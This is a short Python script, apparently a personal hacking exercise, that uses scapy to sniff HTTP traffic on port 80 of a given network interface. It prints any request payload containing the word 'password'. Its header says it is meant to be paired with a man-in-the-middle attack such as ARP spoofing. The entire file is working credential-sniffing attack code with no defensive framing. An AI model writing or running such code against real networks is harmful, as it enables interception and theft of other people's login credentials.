'''
    author : zerobits01
    created: 29-Jan-2020
    purpose: sniffing incoming and outgoing packets
        usually we use with MITM(e.g : arp_spoofer)
'''

import re
import scapy.all as scapy
from scapy.layers import http
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--iface', help='iface that you wanna sniff it', required=True)
args = parser.parse_args()

def process_packet_cb(packet):
    # layer means : tcp, ether,http(through browser usually), ....
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            # we try to print useful info(i found these by practice and test)
            # if we use re sometimes we shouldn't care about other parts
            usefule_info = packet[scapy.Raw].load
            if 'password' in usefule_info : # we should have a good wordlist for check
                print(usefule_info) # if we break the structures they cannot hack us
                # here we can use re.search

'''
    depends on the situation and infomation gathering
    and checking scapy packets we can use different things
    in our programming format
'''

def sniff(interface) :
    scapy.sniff(iface=interface, store=False, prn=process_packet_cb,
                    filter='port 80') # in filter we can write port #,udp,tcp,....
    # udp is faster than tcp

sniff(args.iface)